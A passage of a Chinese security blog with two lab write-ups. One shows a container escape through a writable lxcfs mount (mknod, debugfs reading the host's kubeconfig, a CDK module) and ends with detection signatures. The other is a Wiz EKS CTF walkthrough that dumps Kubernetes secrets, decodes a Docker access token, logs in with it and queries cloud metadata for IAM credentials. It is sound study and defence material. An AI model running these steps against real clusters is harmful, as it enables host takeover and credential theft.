class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">      <span class="attr">volumes:</span>                          <span class="comment"># 挂载lxcfs目录</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/var/lib/lxcfs</span></span><br><span class="line">            <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure>

<p> 验证部署</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116153936192.png" alt="image-20240116153936192"></p>
<h3 id="进入pod配置环境"><a href="#进入pod配置环境" class="headerlink" title="进入pod配置环境"></a>进入pod配置环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it cdk-nginx-5d49fc6b5d-87z77 -n cdk-test /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116154108512.png" alt="image-20240116154108512"></p>
<p>允许lxcfs查看所有设备，这个路径是在进入&#x2F;tmp&#x2F;cgroup&#x2F;devices&#x2F;kubepods.slice&#x2F;kubepods-besteffort.slice后一直深入后得到的，需要依照情况而定</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> a &gt; /tmp/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod4cde57c0_bb78_4ff5_8ce7_cc54c1521ee1.slice/docker-080ea39f7efecf95db7137341f951f30b9ef96aa54566841daa2a22649440bf9.scope/devices.allow</span><br></pre></td></tr></table></figure>

<p>查看&#x2F;etc目录的node号和文件系统类型，确认node号为253:0 文件系统该类型为ext4</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/mountinfo |grep /etc</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116160522696.png" alt="image-20240116160522696"></p>
<h3 id="创建设备进行逃逸"><a href="#创建设备进行逃逸" class="headerlink" title="创建设备进行逃逸"></a>创建设备进行逃逸</h3><p>设备文件名称<code>cdk-test</code>、文件类型<code>b</code>为块设备、主设备号<code>253</code>、次设备号<code>0</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> cdk-test b 253 0</span><br></pre></td></tr></table></figure>

<p>进行调试，通过ls命令和write命令即可读写文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w cdk-test</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116161450819.png" alt="image-20240116161450819"></p>
<h3 id="CDK方式"><a href="#CDK方式" class="headerlink" title="CDK方式"></a>CDK方式</h3><p>（这里换成了ubuntu镜像便于后续看进程细节）</p>
<p>运行cdk逃逸脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
<p>运行debugfs查看host_dev文件系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
<h2 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h2><h3 id="进程特征"><a href="#进程特征" class="headerlink" title="进程特征"></a>进程特征</h3><p>（这里换成了ubuntu镜像好查看进程细节）</p>
<p>这个不是短进程，查看进程信息，&#x2F;bin&#x2F;bash为父进程，debugfs为子进程（参数为-w cdk-test，如果是使用cdk则参数固定为-w host_dev）</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
<h3 id="命令特征"><a href="#命令特征" class="headerlink" title="命令特征"></a>命令特征</h3><p>以下的命令都是固定的，也是由于CDK内置的原因</p>
<p>.&#x2F;cdk run lxcfs-rw</p>
<p> debugfs -w host_dev</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-16</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约499个字, 1分钟39秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/30/%E4%BB%8EEKS-CTF%E7%9C%8B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">从EKS-CTF看云原生安全</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-eksclustergames"><a href="#Wiz-eksclustergames" class="headerlink" title="Wiz-eksclustergames"></a>Wiz-eksclustergames</h1><p>国外云安全厂商Wiz举办了“EKS Cluster Games”——一项云安全夺旗 (CTF) 活动。该挑战由五种不同的场景组成，每种场景都侧重于可能的 Amazon EKS 问题。参与者将扮演攻击者，了解这些错误配置和安全问题，然后在受控环境中利用它们。 </p>
<h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><h3 id="Secret-Seeker-寻找秘密"><a href="#Secret-Seeker-寻找秘密" class="headerlink" title="Secret Seeker 寻找秘密"></a>Secret Seeker 寻找秘密</h3><p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
<h4 id="1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"><a href="#1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）" class="headerlink" title="1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"></a>1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）</h4><p>查看我们的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231229095046674.png" alt="image-20231229095046674"></p>
<p>查看secrets</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets -o yaml</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228131714241.png" alt="image-20231228131714241"></p>
<h2 id="2-第二部分"><a href="#2-第二部分" class="headerlink" title="2. 第二部分"></a>2. 第二部分</h2><p>根据真实事件改编</p>
<p>Wiz在与<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">阿里云</a>和<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql">IBM Cloud</a>的合作中成功地使用了该技术来获取内部容器映像并证明对跨租户数据的未经授权的访问。</p>
<h3 id="Registry-Hunt-仓库狩猎"><a href="#Registry-Hunt-仓库狩猎" class="headerlink" title="Registry Hunt 仓库狩猎"></a>Registry Hunt 仓库狩猎</h3><p>A thing we learned during our research: always check the container registries.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>根据上述描述我们知道目标是registry</p>
<h4 id="2-1-查看pod相关信息"><a href="#2-1-查看pod相关信息" class="headerlink" title="2.1 查看pod相关信息"></a>2.1 查看pod相关信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228133920832.png" alt="image-20231228133920832"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@wiz-eks-challenge:~#</span> <span class="string">kubectl</span> <span class="string">get</span> <span class="string">pods</span> <span class="string">-o</span> <span class="string">yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">kubernetes.io/psp:</span> <span class="string">eks.privileged</span></span><br><span class="line">      <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">database-pod-2c9b3a4e</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;12166896&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">57fe7d43-5eb3-4554-98da-47340d94b4a6</span></span><br><span class="line">  <span class="attr">spec:</span></span><br><span class="line">    <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">eksclustergames/base_ext_image</span></span><br><span class="line">      <span class="attr">imagePullPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">terminationMessagePath:</span> <span class="string">/dev/termination-log</span></span><br><span class="line">      <span class="attr">terminationMessagePolicy:</span> <span class="string">File</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/run/secrets/kubernetes.io/serviceaccount</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">        <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirst</span></span><br><span class="line">    <span class="attr">enableServiceLinks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">imagePullSecrets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">ip-192-168-21-50.us-west-1.compute.internal</span></span><br><span class="line">    <span class="attr">preemptionPolicy:</span> <span class="string">PreemptLowerPriority</span></span><br><span class="line">    <span class="attr">priority:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">    <span class="attr">schedulerName:</span> <span class="string">default-scheduler</span></span><br><span class="line">    <span class="attr">securityContext:</span> &#123;&#125;</span><br><span class="line">    <span class="attr">serviceAccount:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">serviceAccountName:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">tolerations:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/not-ready</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/unreachable</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">      <span class="attr">projected:</span></span><br><span class="line">        <span class="attr">defaultMode:</span> <span class="number">420</span></span><br><span class="line">        <span class="attr">sources:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">serviceAccountToken:</span></span><br><span class="line">            <span class="attr">expirationSeconds:</span> <span class="number">3607</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">token</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">configMap:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">ca.crt</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">ca.crt</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">kube-root-ca.crt</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">downwardAPI:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">fieldRef:</span></span><br><span class="line">                <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">                <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">namespace</span></span><br><span class="line">  <span class="attr">status:</span></span><br><span class="line">    <span class="attr">conditions:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Initialized</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Ready</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">ContainersReady</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">PodScheduled</span></span><br><span class="line">    <span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br><span class="line">          <span class="attr">exitCode:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">finishedAt:</span> <span class="string">&quot;2023-12-07T19:54:25Z&quot;</span></span><br><span class="line">          <span class="attr">reason:</span> <span class="string">Completed</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-11-01T13:32:08Z&quot;</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">ready:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartCount:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">started:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">state:</span></span><br><span class="line">        <span class="attr">running:</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">    <span class="attr">hostIP:</span> <span class="number">192.168</span><span class="number">.21</span><span class="number">.50</span></span><br><span class="line">    <span class="attr">phase:</span> <span class="string">Running</span></span><br><span class="line">    <span class="attr">podIP:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">podIPs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">ip:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">qosClass:</span> <span class="string">BestEffort</span></span><br><span class="line">    <span class="attr">startTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-分析有价值的信息"><a href="#2-2-分析有价值的信息" class="headerlink" title="2.2 分析有价值的信息"></a>2.2 分析有价值的信息</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br></pre></td></tr></table></figure>

<p>根据<a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/pull-image-private-registry/">从私有仓库拉取镜像</a>可以知道这个字段配置了该pod将使用一个名为registry-pull-secrets-780bab1d的secret从私有镜像仓库拉取镜像。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br></pre></td></tr></table></figure>

<p>这一部分告诉了我们容器和镜像的名称和具体ID</p>
<h4 id="2-2-尝试获取secrets信息"><a href="#2-2-尝试获取secrets信息" class="headerlink" title="2.2 尝试获取secrets信息"></a>2.2 尝试获取secrets信息</h4><p>之前在看aqua博客的时候翻到了一个类似的资讯，请见参考文献</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets registry-pull-secrets-780bab1d -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="string">.dockerconfigjson:</span> <span class="string">eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:31:29Z&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;897340&quot;</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">1348531e-57ff-42df-b074-d9ecd566e18b</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">kubernetes.io/dockerconfigjson</span></span><br></pre></td></tr></table></figure>

<p>根据之前的学习我知道.dockerconfigjson会存储有私有仓库的auth信息，将其进行base64解密即可。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;auths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;index.docker.io/v1/&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3-登陆仓库并pull镜像"><a href="#2-3-登陆仓库并pull镜像" class="headerlink" title="2.3 登陆仓库并pull镜像"></a>2.3 登陆仓库并pull镜像</h4><h5 id="docker的方式"><a href="#docker的方式" class="headerlink" title="docker的方式"></a>docker的方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br><span class="line">docker pull eksclustergames/base_ext_image:latest</span><br><span class="line">docker run -it eksclustergames/base_ext_image /bin/bash</span><br></pre></td></tr></table></figure>

<p>在工作目录下找到了flag.txt</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228142957530.png" alt="image-20231228142957530"></p>
<h5 id="crane的方式"><a href="#crane的方式" class="headerlink" title="crane的方式"></a>crane的方式</h5><p>先将镜像以tar包方式导出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane <span class="built_in">export</span> 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 test.tar</span><br></pre></td></tr></table></figure>

<p>再解包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf test.tar</span><br></pre></td></tr></table></figure>

<p>就可以看到flag.txt了</p>
<h2 id="3-第三部分"><a href="#3-第三部分" class="headerlink" title="3. 第三部分"></a>3. 第三部分</h2><p>在此挑战中，您从实例元数据服务 (IMDS) 检索了凭据。展望未来，这些凭据将在 Pod 中随时可用，以便您轻松使用。</p>
<h3 id="Image-Inquisition-镜像渗透"><a href="#Image-Inquisition-镜像渗透" class="headerlink" title="Image Inquisition 镜像渗透"></a>Image Inquisition 镜像渗透</h3><p>A pod’s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</p>
<p>Remember: You are running inside a compromised EKS pod.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>这里参考了腾讯云的一篇文章，根据文章提及的手法进行渗透，请见参考文献部分</p>
<h4 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h4><p>查看所有类别的元数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228150321381.png" alt="image-20231228150321381"></p>
<p>查看所有iam角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials</span><br></pre></td></tr></table></figure>

